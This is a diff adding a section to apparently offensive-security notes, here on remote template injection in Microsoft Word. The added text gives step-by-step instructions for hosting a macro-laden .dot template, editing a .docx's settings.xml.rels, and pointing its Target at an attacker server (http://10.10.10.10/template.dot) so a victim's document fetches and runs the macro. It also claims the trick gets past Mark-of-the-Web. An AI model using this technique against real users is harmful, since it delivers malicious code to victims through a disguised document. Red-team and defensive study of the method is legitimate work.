@@ -60,3 +60,18 @@ proc.Create "powershell"
 
 
 > **OPSEC Note**: In that case, powershell will be a child of `WmiPrvSE.exe` rather than MS Word.
+
+
+# Remote Template Injection
+
+
+Microsoft Word has the option of creating a new document from a template. Office has some templates pre-installed. Remote template injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious script.
+
+* Create a word add a macro and save it as `Word 97-2003 Template (.dot)`. This will be out malicious remote template, and we can also host this file.
+* Next, create a new document from the blank template located in `C:\Users\User\Documents\Custom Office Templates`. Add any content and save it as `.docx`.
+* Browse to the directory in explorer, right-click and select `7-zip -> Open Archive`. Navigate to `word -> _rels`, right-click on `settings.xml.rels` and select Edit. Change the Target entry and specify out hosted template.
+
+```
+Target="http://10.10.10.10/template.dot"
+```
+This will allow to execute the macro even if its flagged with MOTW.
